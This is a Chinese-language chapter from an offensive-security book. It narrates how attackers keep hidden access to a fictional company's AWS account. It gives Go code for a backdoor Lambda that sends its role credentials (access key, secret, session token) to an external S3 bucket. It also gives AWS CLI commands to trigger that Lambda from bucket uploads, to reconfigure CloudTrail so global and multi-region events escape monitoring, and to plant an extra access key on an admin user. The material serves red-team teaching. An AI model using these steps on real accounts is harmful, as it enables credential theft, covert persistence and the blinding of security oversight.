# 第十一章：然而，我们依旧坚持了下来

![](img/chapterart.png)

当我们等待我们的 shell 向主机发送信号时，还有一项小任务需要我们立即处理：AWS 持久化。有人可能会辩称，Jenkins 的访问密钥提供了我们所需的所有持久化，因为访问密钥通常很难旋转，并且需要检查数百个作业，以查找潜在的硬编码凭证。它是任何 DevOps 基础设施中的关键组成部分，具有讽刺意味的是，它也容易遭遇 DevOps 对抗的同样谬论——最新的证据就是我们从 Chef 获取的凭证仍然在使用中。

然而，我们在等待 GP 机器上的 shell 时还有一些空闲时间，所以让我们进一步巩固对 MXR Ads 的控制。

## AWS 哨兵

对 AWS 账户进行后门植入是一项精细的操作，需要在充满监控工具和敏感警报的环境中航行。AWS 已经做出了相当大的努力，通过各种指标来引导客户识别可疑活动以及认为不安全的配置。

在盲目攻击或后门植入一个账户之前，应该特别注意两个 AWS 特性：IAM 访问分析器和 CloudTrail Insights。

IAM 访问分析器会标记每个授予外部实体读/写权限的策略文档。它主要覆盖 S3 存储桶、KMS 密钥、Lambda 函数和 IAM 角色。当这个功能首次推出时，它打破了一个非常隐秘的持久化策略：在受害者账户中创建管理员角色，并授予一个外部（我们的）AWS 账户假设角色的权限。

我们可以快速检查 `eu-west-1` 区域是否生成了任何访问分析器报告：

```
root@Point1:~/# aws accessanalyzer list-analyzers --region=eu-west-1
{ "analyzers": [] }
```

MXR Ads 目前还没有利用这一功能，但我们不能指望公司的无知能让我们持续保持后门，尤其是当这个功能只需要点击一次就能暴露我们的后门时。

CloudTrail 是一项 AWS 服务，它几乎会记录每个 AWS API 调用，采用 JSON 格式，并可选择性地将日志存储在 S3 上，或将其转发到像 CloudWatch 这样的其他服务，以便配置指标和警报。清单 11-1 是一个 IAM 调用事件的示例，创建了管理员用户的访问密钥。该事件包含了对任何威胁分析师来说至关重要的信息：源 IP 地址、调用者身份、事件来源等等。

```
# Sample CloudTrail event creating an additional access key
{
    "eventType": "AwsApiCall",
    "userIdentity": {
        "accessKeyId": "ASIA44ZRK6WS32PCYCHY",
        "userName": "admin"
    },
    "eventTime": "2019-12-29T18:42:47Z",
    "eventSource": "iam.amazonaws.com",
    "eventName": "CreateAccessKey",
    "awsRegion": "us-east-1",
    "sourceIPAddress": "215.142.61.44",
    "userAgent": "signin.amazonaws.com",
    "requestParameters": { "userName": "admin" },
    "responseElements": {
        "accessKey": {
            "accessKeyId": "AKIA44ZRK6WSRDLX7TDS",
 "status": "Active",
            "userName": "admin",
            "createDate": "Dec 29, 2019 6:42:47 PM"
}   }   }
```

清单 11-1：CloudTrail `CreateAccessKey` 事件

你不得不佩服 AWS 将日志事件做得如此直观。

MXR Ads 拥有覆盖所有区域的全球综合日志策略，如清单 11-2 所示。

```
root@Point1:~/# aws cloudtrail describe-trails --region=eu-west-1
"trailList": [{
   "IncludeGlobalServiceEvents": true,
   "Name": "Default",
   "S3KeyPrefix": "region-all-logs",
   "IsMultiRegionTrail": true,
 1"HasInsightSelectors": true,
 2"S3BucketName": "mxrads-cloudtrail-all",
   "CloudWatchLogsLogGroupArn": "arn:aws:logs:eu-west-1:886371554408:
log-group:CloudTrail/Logs:*",
...}]
```

清单 11-2：在 CloudTrail 上配置一个将日志转发到 CloudWatch 和 S3 的轨迹

日志被转发到 S3 存储桶 `mxrads-cloudtrail-all` 2。

从标志 `HasInsightSelectors` 1 中，我们看到 MXR Ads 正在尝试一个名为 *Insights* 的 CloudTrail 功能，它检测 API 调用的激增并将其标记为可疑事件。截至目前，它只报告写操作的 API 调用，如 `RunInstance`、`CreateUser`、`CreateRole` 等等。我们仍然可以对只读和侦察性调用进行操作，但一旦开始自动化用户账户创建等操作时，我们必须小心不要触及 CloudTrail Insights 设置的动态阈值。

这两个功能（CloudTrail Insights 和 IAM Access Analyzer）是对其他现有服务的补充，例如 GuardDuty，它们监视可疑事件，如禁用安全功能（CloudTrail）和与已知恶意域的通信。我们可以使用以下命令检查某个区域是否启用了 GuardDuty：

```
root@Point1:~/# aws guardduty list-detectors --region=eu-west-1
{ "DetectorIds": [ "64b5b4e50b86d0c7068a6537de5b770e" ] }
```

即使 MXR Ads 忽略了实现所有这些新颖的功能，CloudTrail 作为一个基础组件，几乎每个公司都会默认启用它。我们可以清空存储 CloudTrail 数据的 S3 存储桶，但日志仍然会至少在 CloudTrail 中保留 90 天。

每当日志如此容易获得且非常有用时，谨慎的做法是假设最坏的情况：监控仪表板跟踪 API 调用、IP 地址、调用的服务类型、对高权限服务的异常查询等等。

还有一个锦上添花的因素：Terraform。我们知道 MXR Ads 依赖 Terraform 来维护其基础设施。如果我们手动更改错误的资源，下一次运行 `terraform plan` 命令时它会像一个显眼的伤口一样引人注目。带有主题“你已被黑” 的邮件或许能更容易被忽略。

这些是在与 AWS 账户交互时需要牢记的主要陷阱。它们真的是地雷，稍有不慎就会爆炸。几乎让人怀念起以前在 Windows Active Directory 中植入后门的日子，那时从单台机器收集和解析事件日志是一个两天的工作。

现在，如果你正处于目标安全性非常差的情况下，并且觉得自己可以通过手动创建几个访问密钥，添加一些可信的 IAM 用户并赋予他们管理员权限，那么请随意。在这种情况下，完全不需要过度设计后门策略，尤其是考虑到 Jenkins 的访问密钥相对稳定。

然而，如果公司看起来过于多疑——严格的访问控制、有限的权限、干净的活跃用户列表，以及正确配置的 CloudTrail、CloudWatch 和其他监控工具——那么你可能需要一个更强大且更加隐蔽的备份策略。

为了讨论的方便，我们暂且给 MXR Ads 一个怀疑的好处，假设情况最坏。我们如何在不被察觉的情况下保持持续的访问？

## 保持绝对机密

我们的后门策略将遵循最新的设计架构，完全无服务器并且事件驱动。我们将配置一个监视程序，在特定事件发生时触发，并在检测到这些事件时触发一个作业，以恢复我们的访问权限。

翻译成 AWS 行话，监视程序将由一个 Lambda 函数组成，该函数由我们选择的事件触发。例如，我们可以选择一个每天上午 10 点触发的 CloudWatch 事件，或者一个接收到预定义请求的负载均衡器。我们选择一个事件，该事件会在 S3 桶接收到新对象时触发。MXR Ads 和 GP 都使用这个相同的触发器，因此我们有更高的机会与其融合。一旦执行，Lambda 将转储其附加的角色凭证，并将其发送到我们自己的 S3 桶。我们收到的凭证有效期为一小时，但足以恢复持久的访问权限。

让我们回顾一下我们的检测清单：Lambda 函数将由一些频繁发生的内部事件触发（在这种情况下，当对象上传到 MXR Ads 的 S3 桶时），并且作为回应，将执行一个相当简单的 put-object 调用，将包含其凭证的文件存储到远程桶。IAM Access Analyzer 几乎不会有任何反应。

Terraform 在设置阶段不会发出强烈的警告，因为大多数资源将被创建，而不是修改。即使源桶已经在状态中声明，从技术上讲，我们仍将添加一个 `aws_s3_bucket_notification` 资源，这是 Terraform 中一个完全独立的实体。我们所需要做的就是选择一个没有 Terraform 通知设置的桶，之后就可以继续操作了。

至于 CloudTrail，它将记录的唯一事件是可信服务 *lambda.amazonaws.com* 模拟角色执行 Lambda。这是任何 Lambda 执行中固有的琐碎事件，不会引起 Insights 和 GuardDuty 的注意。

一切看起来都很顺利！

### 执行程序

让我们进入实现阶段。Lambda 将运行的程序是一个直接的 Go 二进制文件，按照刚才描述的关键步骤执行。完整的实现可以在本书的代码库中找到（[`bit.ly/2Oan7I7`](http://bit.ly/2Oan7I7)），以下是主要逻辑的简要概述。

每个注定要在 Lambda 环境中运行的 Go 程序都会从相同的模板 `main` 函数开始，注册 Lambda 的入口点（在本例中为 `HandleRequest`）：

```
func main() {
    lambda.Start(HandleRequest)
}
```

接下来，我们有一个经典的设置，用来构建一个 HTTP 客户端并创建远程 S3 URL 以提交我们的响应：

```
const S3BUCKET="mxrads-analytics"
func HandleRequest(ctx context.Context, name MyEvent) (string, error) {
    client := &http.Client{}
    respURL := fmt.Sprintf("https://%s.s3.amazonaws.com/setup.txt", S3BUCKET)
```

我们从环境变量中转储 Lambda 的角色凭证，并将其发送到我们的远程桶：

```
 accessKey := fmt.Sprintf(`
        AWS_ACCESS_KEY_ID=%s
        AWS_SECRET_ACCESS_KEY=%s
        AWS_SESSION_TOKEN=%s"`,
            os.Getenv("AWS_ACCESS_KEY_ID"),
            os.Getenv("AWS_SECRET_ACCESS_KEY"),
            os.Getenv("AWS_SESSION_TOKEN"),
        )
    uploadToS3(s3Client, S3BUCKET, "lambda", accessKey)
```

`uploadToS3` 方法是一个简单的 PUT 请求，发送到之前定义的 URL，因此从源代码中可以很容易理解其实现，源代码总共有大约 44 行。

我们编译代码，然后将二进制文件压缩：

```
root@Point1:lambda/# make
root@Point1:lambda/# zip function.zip function
```

现在我们将注意力转向设置 Lambda。

### 构建 Lambda

Lambda 需要一个具有强大 IAM 和 CloudTrail 权限的执行角色，以帮助我们维持隐秘的长期访问（稍后会详细说明）。

我们寻找有潜力的候选者，以便用 Lambda AWS 服务进行伪装。请记住，为了伪装一个角色，必须满足两个条件：用户必须能够发起 `sts assume-role` 调用，并且该角色必须允许该用户进行伪装。我们列出了 MXR Ads AWS 账户中的可用角色：

```
root@Point1:~/# aws iam list-roles \
**| jq -r '.Roles[] | .RoleName + ", " + \**
**.AssumeRolePolicyDocument.Statement[].Principal.Service' \**
**| grep "lambda.amazonaws.com"**

dynamo-access-mgmt, lambda.amazonaws.com
chef-cleanup-ro, lambda.amazonaws.com
`--snip--`
```

我们检查每个角色的 IAM 策略，直到找到一个具有我们所需权限的角色——理想情况下是完全的 IAM 和 CloudTrail 访问权限：

```
root@Point1:~/# aws iam list-attached-role-policies --role dynamo-ssh-mgmt --profile jenkins

"AttachedPolicies": [
     "PolicyName": IAMFullAccess",
     "PolicyName": cloudtrail-mgmt-rw",
     "PolicyName": dynamo-temp-rw",
`--snip--`
```

`dynamo-ssh-mgmt` 角色可能可以派上用场，因为它具有 `IAMFullAccess` 策略。狡猾。如果我们在 MXR Ads 的 AWS 账户中从零开始创建角色，我们可能不会敢于附加这样一个明显的策略。然而，既然他们已经在使用它，我们不妨利用一下。而且，这个角色缺少 CloudWatch 写权限，因此 Lambda 在终止时会悄悄丢弃其执行日志，而不是将其传递给 CloudWatch。完美。

一如既往，我们通过遵循现有的命名约定来试图隐匿在明处。我们查看 `eu-west-1` 区域中现有的 Lambda 函数，以寻求灵感：

```
root@Point1:~/# aws iam lambda list-functions –region=eu-west-1
"FunctionName": "support-bbs-news",
"FunctionName": "support-parse-logs",
"FunctionName": "ssp-streaming-format",
`--snip--`
```

我们决定使用名称 `support-metrics-calc`，并调用 `create-function` API 来注册我们的后门 Lambda：

```
root@Point1:~/# aws lambda create-function --function-name support-metrics-calc \
**--zip-file fileb://function.zip \**
**--handler function \**
**--runtime go1.x \**
**--role arn:aws:iam::886371554408:role/dynamo-ssh-mgmt \**
**--region eu-west-1**
```

现在来看触发事件本身。

### 设置触发事件

理想情况下，我们希望瞄准一个由 MXR Ads 定期更新的 S3 桶，但并不会频繁到每天触发 Lambda 1,000 次的程度。

那么，怎么样呢？s4d.mxrads.com 是我们在第八章中查看过的存储所有创意的桶。通过一个快速的 `list-objects-v2` API 调用可以发现，更新速度相对较慢，每天在 50 到 100 个文件之间：

```
root@Point1:~/# aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_keys.txt
 "Key": "2aed773247f0211803d5e67b/82436/vid/720/6aa58ec9f77aca497f90c71c85ee.mp4",
 "LastModified": "2019-12-14T11:01:48.000Z",
`--snip--`

root@Point1:~/# grep -c "2020-12-14" list_keys.txt
89
root@Point1:~/# grep -c "2020-12-13" **list_keys.txt**
74
`--snip--`
```

我们可以通过对触发通知事件的对象进行采样来减少触发率。我们将设置为仅以 `"2"` 开头的对象才会触发 Lambda，这样我们就得到了 1/16 的采样率（假设十六进制键空间均匀分布）。这大约意味着每天三到六次调用。

成交。

我们明确允许 S3 服务调用我们的 Lambda 函数。`statement-id` 参数是一个任意的、唯一的名称：

```
root@Point1:~/# aws lambda add-permission \
**--function-name support-metrics-calc \**
**--region eu-west-1 \**
**--statement-id s3InvokeLambda12 \**
**--action "lambda:InvokeFunction" \**
**--principal s3.amazonaws.com \**
**--source-arn arn:aws:s3:::s4d.mxrads.com \**
**--source-account 886371554408 \**
**--profile jenkins**
```

然后，我们设置桶规则，仅在创建以 `"2"` 前缀开头的对象时触发事件：

```
root@Point1:~/# aws s3api put-bucket-notification-configuration \
**--region eu-west-1 \**
**--bucket mxrads-mywebhook \**
**--profile jenkins \**
**--notification-configuration file://<(cat << EOF**
**{**
 **"LambdaFunctionConfigurations": [{**
 **"Id": "s3InvokeLambda12",**
 **"LambdaFunctionArn": "arn:aws:lambda:eu-west-1:886371554408**
**:function:support-metrics-calc",**
 **"Events": ["s3:ObjectCreated:*"],**
 **"Filter": {**
 **"Key": {**
 **"FilterRules": [{**
 **"Name": "prefix",**
 **"Value": "2"**
 **}]**
 **}**
 **}**
 **}]**
**}**
**EOF**
**)**
```

太棒了。我们有了一个可靠的持久化策略，能够绕过旧的和新的检测功能。

假设我们的 Jenkins 访问权限被撤销，并且我们希望使用 Lambda 凭据重新建立永久访问。我们是否应该直接创建一个拥有无限权限的新 IAM 用户，继续我们的生活？这不是最明智的做法。任何基于 CloudTrail 的监控解决方案都可能在几分钟内捕捉到这个异常请求。

如我们之前所见，当前的 CloudTrail 配置将所有区域的日志汇总到 `eu-west-1` 区域。然后，这些日志会被推送到 S3 和 CloudWatch，供监控设备使用。这个事件转发功能被称为 *trail*。

在调用任何 IAM 操作之前，我们需要打乱这个日志记录。

### 隐藏痕迹

请注意，我们的目的是打乱日志记录，而不是完全禁用它。事实上，目前无法完全禁用 CloudTrail 或使其跳过事件。无论我们做什么，我们的 API 调用仍然会出现在 CloudTrail 事件仪表板上，持续 90 天。

然而，日志记录可以重新配置，排除某些事件的转发。我们甚至可以在执行恶意任务时，将整个区域的日志记录隐藏。

没有日志记录意味着 S3 上没有日志，没有 GuardDuty，没有 CloudTrail Insights，没有 CloudWatch 指标，也没有自定义安全仪表板。就像多米诺骨牌一样，所有的监控工具，无论是 AWS 内部还是外部，都会相继倒下，发出沉默的巨响。如果我们添加 100 个 IAM 用户或在圣保罗启动 1,000 个实例，除了财务部门外，没人会注意到。

这是一个简短的示例，展示了我们如何重新配置日志记录以排除全局（IAM、STS 等）和多区域事件：

```
root@Point1:~/# curl https://mxrads-report-metrics.s3-eu-west-1.amazonaws.com/lambda

AWS_ACCESS_KEY_ID=ASIA44ZRK6WSTGTH5GLH
AWS_SECRET_ACCESS_KEY=1vMoXxF9Tjf2OMnEMU...
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEPT...

# We load these ENV variables, then disable CloudTrail global and multiregion logging
root@Point1:~/# aws cloudtrail update-trail \
**--name default \**
**--no-include-global-service-events \**
**--no-is-multi-region \**
**--region=eu-west**

"Name": "default",
"S3BucketName": "mxrads-cloudtrail-logs",
"IncludeGlobalServiceEvents": false,
"IsMultiRegionTrail": false,
`--snip--`
```

从这一刻开始，我们有了 *特权授权*，可以创建用户和访问密钥，进行各种胡闹。如果有人手动查看 CloudTrail 仪表板，可能会发现我们的 API 调用，前提是我们非常粗心，但所有自动化解决方案和工具都将处于黑暗中。

### 恢复访问

现在我们已经禁用了 CloudTrail，可以继续创建更永久的 AWS 凭证。

与默认管理员策略关联的用户和组很容易成为攻击目标。IAM 用户的访问密钥最多只有两个，因此我们会找到一个拥有一个或零个访问密钥的用户，并继续注入一个我们将秘密拥有的附加密钥。首先，我们列出用户和组：

```
root@Point1:~/# aws iam list-entities-for-policy \
**--policy-arn arn:aws:iam::aws:policy/AdministratorAccess**

UserName: b.daniella
UserName: chris.hitch
UserName: d.ressler
`--snip--`
```

然后我们列出他们当前定义的访问密钥：

```
# List access keys. If they have less than 2, there's room for another.
root@Point1:~/# aws iam list-access-keys \
**--user b.daniella \**
**| jq ".AccessKeyMetadata[].AccessKeyId"**

"AKIA44ZRK6WS2XS5QQ4X"
```

很好，*b.daniella* 只有一个密钥。确定目标后，我们创建一个访问密钥：

```
root@Point1:~/# aws iam create-access-key --user b.daniella
UserName: b.daniella,
AccessKeyId: AKIA44ZRK6WSY37NET32,
SecretAccessKey: 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,
```

我们恢复了业务。我们已经重新获得了永久凭证。

我们目前还无法重新启用多区域日志记录。我们需要在最后一次 API 调用后至少等待半小时。这个等待时间至关重要，因为事件到达 CloudTrail 可能需要最多 20 分钟。如果我们过早重新激活全局事件日志记录，一些操作可能会进入日志记录，从而进入 S3、Insights、CloudWatch 和其他平台。

## 替代（更糟糕）方法

你可能会想，为什么我们不直接使用 Lambda 来自动化后续的 IAM/CloudTrail 操作呢？Lambda 函数最大只能运行 15 分钟，所以很有可能它会过早地重新启用全局事件日志。我们可以在我们这边挂载另一个 Lambda 来避免这种竞争条件，但这对于如此简单的事情来说，太过繁琐了。

另外，我们也可以选择直接在 Lambda 环境中运行反向 Shell，但那并不方便。该函数运行在一个最小化的容器中，文件系统以只读方式挂载，除了*/tmp*文件夹，该文件夹没有可执行标志。我们需要手动将反向 Shell 加载到内存中作为独立进程运行，以避免被 Lambda 处理程序终止。这一切又是为了什么？一个缺乏最基本实用工具的荒芜之地，而且 AWS 会在 60 分钟内回收它？不值得。

## 资源

+   关于 IAM 访问分析器的更多信息：[`aws.amazon.com/iam/features/analyze-access/`](https://aws.amazon.com/iam/features/analyze-access/)。

+   关于 CloudTrail Insights 的更多信息：[`amzn.to/38ROX6E`](https://amzn.to/38ROX6E)。

+   AWS S3 通知事件列表：[`amzn.to/2MTqg1o`](https://amzn.to/2MTqg1o)。

+   关于集中化日志的更多信息：[`www.loggly.com/ultimate-guide/centralizing-windows-logs/`](https://www.loggly.com/ultimate-guide/centralizing-windows-logs/)。

+   关于查询 Windows 日志的更多信息：[`evotec.xyz/powershell-everything-you-wanted-to-know-about-event-logs/`](https://evotec.xyz/powershell-everything-you-wanted-to-know-about-event-logs/)。
